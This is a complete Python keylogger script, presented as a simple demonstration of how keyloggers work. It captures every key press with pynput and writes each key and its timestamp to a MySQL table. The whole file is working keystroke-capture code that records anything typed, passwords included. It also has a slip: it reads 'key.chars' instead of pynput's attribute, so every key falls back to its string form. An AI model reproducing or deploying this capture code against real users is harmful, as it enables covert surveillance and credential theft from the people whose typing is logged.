#simple program to understand how keyloggers work and store information in a database

import mysql.connector
from mysql.connector import Error
from pynput import keyboard
import datetime
from config import db_config

def create_db_connection(config):
    """Establish a connection to the MySQL database."""
    try:
        conn = mysql.connector.connect(**config)
        if conn.is_connected():
            print("Connected to MySQL database")
            return conn
    except Error as e:
        print("Error connecting to MySQL:", e)
        exit(1)

def setup_database(conn):
    """Create the keylogs table if it doesn't exist."""
    create_table_query = """
    CREATE TABLE IF NOT EXISTS keylogs (
        id INT AUTO_INCREMENT PRIMARY KEY,
        log_time DATETIME,
        `key` VARCHAR(255)
    )
    """
    try:
        cursor = conn.cursor()
        cursor.execute(create_table_query)
        conn.commit()
    except Error as e:
        print("Error creating table:", e)
        exit(1)

# setup table
connection = create_db_connection(db_config)
setup_database(connection)
cursor = connection.cursor()

# gets the key pressed and time and inserts into table
def on_press(key):
    """Callback function triggered on each key press."""
    try:
        key_str = key.chars
    except AttributeError:
        key_str = str(key)
    
    log_time = datetime.datetime.now()
    insert_query = "INSERT INTO keylogs (log_time, `key`) VALUES (%s, %s)"
    data_tuple = (log_time, key_str)
    
    try:
        cursor.execute(insert_query, data_tuple)
        connection.commit()
        print(f"Logged: {key_str} at {log_time}")
    except Error as e:
        print("Error inserting log:", e)

def main():
    # start listener
    with keyboard.Listener(on_press=on_press) as listener:
        print("Key logger is running. Press Ctrl+C to stop.")
        listener.join()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nKey logger stopped by user.")
    finally:
        if connection.is_connected():
            cursor.close()
            connection.close()
